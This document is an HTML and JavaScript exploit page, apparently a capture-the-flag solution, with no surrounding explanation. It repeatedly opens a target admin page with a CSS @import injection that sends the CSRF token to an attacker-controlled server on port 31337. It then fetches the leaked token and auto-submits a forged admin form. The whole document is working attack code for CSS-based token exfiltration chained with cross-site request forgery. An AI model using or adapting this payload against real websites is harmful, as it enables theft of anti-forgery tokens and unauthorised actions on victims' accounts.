<form action="http://{{ host }}:5000/admin" method="post">
    <input name="username" value="tyagetyage">
    <input name="csrf_token" value="">
</form>
<script>
    function stage1() {
        target = "http://{{ host }}:5000/admin?message=<style>@import'http://host.docker.internal:31337/{{ key }}'</style>"
        target_window = window.open(target, "_blank", "location=yes")
        counter = 1
        interval_id = setInterval(function () {
            target_window.location = target
            counter += 1
            if (counter > 32) {
                clearInterval(interval_id)
                stage2()
            }
        }, 200)
    }

    async function stage2() {
        response = await fetch('/{{ key }}/leaked')
        leaked = await response.text()
        console.log(leaked)
        document.forms[0].csrf_token.value = leaked
        document.forms[0].submit()
    }

    stage1()
</script>
